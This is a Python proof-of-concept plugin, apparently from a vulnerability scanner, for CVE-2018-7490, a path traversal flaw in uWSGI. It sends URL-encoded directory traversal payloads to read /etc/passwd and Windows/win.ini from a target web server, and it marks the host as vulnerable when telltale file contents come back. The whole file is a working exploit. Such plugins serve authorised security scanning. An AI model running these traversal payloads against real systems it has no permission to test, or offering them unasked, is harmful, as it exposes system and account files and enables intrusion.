#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2018-7490'
        self.keyword = ['uwsgi']
        self.info = 'CVE-2018-7490'
        self.type = 'file'
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, '')
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    pocs = ['..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
                            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fWindows/win.ini',]
                    for poc in pocs:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res:
                                text = await res.text()
                                if "root:" in text or '[extensions]' in text:
                                    self.flag = 1
                                    self.res.append({"info": url, "key": "CVE-2018-7490"})
                                    return
